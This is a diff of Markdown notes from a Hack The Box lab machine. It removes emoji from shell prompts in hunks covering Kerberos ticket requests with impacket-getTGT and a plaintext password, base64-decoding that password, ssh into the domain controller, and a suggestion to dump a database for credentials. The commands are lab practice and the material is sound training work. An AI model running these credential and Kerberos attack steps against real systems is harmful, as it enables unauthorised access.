@@ -59,21 +59,21 @@ Scanned in 62.56 seconds
 # Kerberos TGT Extraction and Usage Notes
 
 ```
-┌──(jrios㉿warmonger)-[~/…/HTB/Machines/theFizz/TGT]
-└─$ faketime 'now + 7 hours' impacket-getTGT   FRIZZ.HTB/m.schoolbus:'!suBcig@MehTed!R'
+(jrioswarmonger)-[~/…/HTB/Machines/theFizz/TGT]
+$ faketime 'now + 7 hours' impacket-getTGT   FRIZZ.HTB/m.schoolbus:'!suBcig@MehTed!R'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in m.schoolbus.ccache
 
-┌──(jrios㉿warmonger)-[~/…/HTB/Machines/theFizz/TGT]
-└─$ ls
+(jrioswarmonger)-[~/…/HTB/Machines/theFizz/TGT]
+$ ls
 m.schoolbus.ccache
 
-┌──(jrios㉿warmonger)-[~/…/HTB/Machines/theFizz/TGT]
-└─$ export KRB5CCNAME=m.schoolbus.ccache         
+(jrioswarmonger)-[~/…/HTB/Machines/theFizz/TGT]
+$ export KRB5CCNAME=m.schoolbus.ccache         
 
-┌──(jrios㉿warmonger)-[~/…/HTB/Machines/theFizz/TGT]
-└─$ klist                       
+(jrioswarmonger)-[~/…/HTB/Machines/theFizz/TGT]
+$ klist                       
 Ticket cache: FILE:m.schoolbus.ccache
 Default principal: m.schoolbus@FRIZZ.HTB
 
@@ -255,7 +255,7 @@ $databaseName     = 'gibbon';
   * `login.php`
   * `preferencesPasswordProcess.php`
 
-> 💡 **Next Steps:** Dump and analyze `gibbon.sql` for user credentials and roles. Try MySQL login with the credentials to explore further privilege escalation or data exfiltration.
+>  **Next Steps:** Dump and analyze `gibbon.sql` for user credentials and roles. Try MySQL login with the credentials to explore further privilege escalation or data exfiltration.
 
 ```
 
@@ -341,7 +341,7 @@ Let’s break it down:
 
 ---
 
-### 🔍 Analysis of the Output
+###  Analysis of the Output
 
 ```text
 | ssh-auth-methods: 
@@ -506,18 +506,18 @@ This is **just a convention**, but a widely followed one:
 
 | Term           | Example          | Case-sensitive? | Notes                               |
 | -------------- | ---------------- | --------------- | ----------------------------------- |
-| Hostname       | `frizz.htb`      | ❌ no            | DNS is case-insensitive             |
-| Kerberos Realm | `FRIZZ.HTB`      | ✅ **yes**       | Must match `/etc/krb5.conf` exactly |
-| Principal      | `user@FRIZZ.HTB` | ✅ yes           | Must use correct realm casing       |
+| Hostname       | `frizz.htb`      |  no            | DNS is case-insensitive             |
+| Kerberos Realm | `FRIZZ.HTB`      |  **yes**       | Must match `/etc/krb5.conf` exactly |
+| Principal      | `user@FRIZZ.HTB` |  yes           | Must use correct realm casing       |
 
 
 Here’s a **detailed breakdown for your notes** explaining what’s happening in your PowerShell session related to the Recycle Bin:
 
 ---
 
-## 🗑️ PowerShell + Recycle Bin Internals — Notes
+##  PowerShell + Recycle Bin Internals — Notes
 
-### ▶ Command:
+###  Command:
 
 ```powershell
 (New-Object -ComObject Shell.Application).NameSpace(0xA).Items() | Select-Object name
@@ -627,8 +627,8 @@ Mode                 LastWriteTime         Length Name
 ```
 
 ```bash
-┌─[us-vip-11]─[10.10.14.21]─[drnatas@htb-za6bfwqv0g]─[~/Documents/uploads/wapt/conf]
-└──╼ [★]$ cat waptserver.ini
+[us-vip-11][10.10.14.21][drnatas@htb-za6bfwqv0g][~/Documents/uploads/wapt/conf]
+ []$ cat waptserver.ini
 [options]
 allow_unauthenticated_registration = True
 wads_enable = True
@@ -646,17 +646,17 @@ root_dir = c:\wapt\waptserver\repository\wads\pxe
 log_path = c:\wapt\log
 
 
-┌──(jrios㉿banhammer)-[/tmp]
-└─$ echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d
+(jriosbanhammer)-[/tmp]
+$ echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d
 !suBcig@MehTed!R
 
 # HISTORY FAVORS THE BOLD TESTING ALL THE OTHER ACCOUNTS WITH KERBEROS
 
-┌─[us-vip-11]─[10.10.14.21]─[drnatas@htb-za6bfwqv0g]─[~/Documents/uploads]
-└──╼ [★]$ kinit m.schoolbus@FRIZZ.HTB
+[us-vip-11][10.10.14.21][drnatas@htb-za6bfwqv0g][~/Documents/uploads]
+ []$ kinit m.schoolbus@FRIZZ.HTB
 Password for m.schoolbus@FRIZZ.HTB: 
-┌─[us-vip-11]─[10.10.14.21]─[drnatas@htb-za6bfwqv0g]─[~/Documents/uploads]
-└──╼ [★]$ ssh m.schoolbus@FRIZZ.HTB -K
+[us-vip-11][10.10.14.21][drnatas@htb-za6bfwqv0g][~/Documents/uploads]
+ []$ ssh m.schoolbus@FRIZZ.HTB -K
 PowerShell 7.4.5
 PS C:\Users\Administrator> get-gpo -all
 
